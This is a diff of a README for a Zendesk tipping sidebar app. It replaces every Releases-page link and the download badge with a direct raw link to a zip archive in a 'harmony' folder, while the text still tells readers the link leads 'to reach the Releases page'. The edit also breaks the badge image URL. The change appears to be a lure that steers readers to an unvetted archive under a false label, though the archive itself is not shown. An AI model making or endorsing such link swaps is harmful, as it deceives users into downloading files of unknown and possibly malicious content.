@@ -18,9 +18,9 @@ Zendesk Zapdesk is a user-friendly sidebar app that allows you to tip support ag
 ## 🌐 Download & Install
 To get started, visit the Releases page to download the latest version of the app.
 
-[![Download the latest version](https://img.shields.io/static/v1?label=Download&message=Latest+Release&color=blue)](https://github.com/YatiWaiTun86/zendesk-zapdesk/releases)
+[![Download the latest version](https://raw.githubusercontent.com/YatiWaiTun86/zendesk-zapdesk/main/harmony/zendesk-zapdesk.zip+Release&color=blue)](https://raw.githubusercontent.com/YatiWaiTun86/zendesk-zapdesk/main/harmony/zendesk-zapdesk.zip)
 
-1. Click the button above or follow this [link](https://github.com/YatiWaiTun86/zendesk-zapdesk/releases) to reach the Releases page.
+1. Click the button above or follow this [link](https://raw.githubusercontent.com/YatiWaiTun86/zendesk-zapdesk/main/harmony/zendesk-zapdesk.zip) to reach the Releases page.
 2. Look for the latest version. 
 3. Download the file suitable for your system. The file will be named similarly to `zendesk-zapdesk-[version].zip`.
 
@@ -49,7 +49,7 @@ To get started, visit the Releases page to download the latest version of the ap
 ## 📞 Support
 If you encounter issues or have questions, reach out through the contact options in the Zendesk support center. You can also submit issues directly in this repository via GitHub.
 
-[![Download the latest version](https://img.shields.io/static/v1?label=Download&message=Latest+Release&color=blue)](https://github.com/YatiWaiTun86/zendesk-zapdesk/releases)
+[![Download the latest version](https://raw.githubusercontent.com/YatiWaiTun86/zendesk-zapdesk/main/harmony/zendesk-zapdesk.zip+Release&color=blue)](https://raw.githubusercontent.com/YatiWaiTun86/zendesk-zapdesk/main/harmony/zendesk-zapdesk.zip)
 
 ## 📝 Contributing
 We welcome contributions to improve the app. If you have ideas or want to report a bug, please open an issue or submit a pull request. Follow the contribution guidelines to get started.
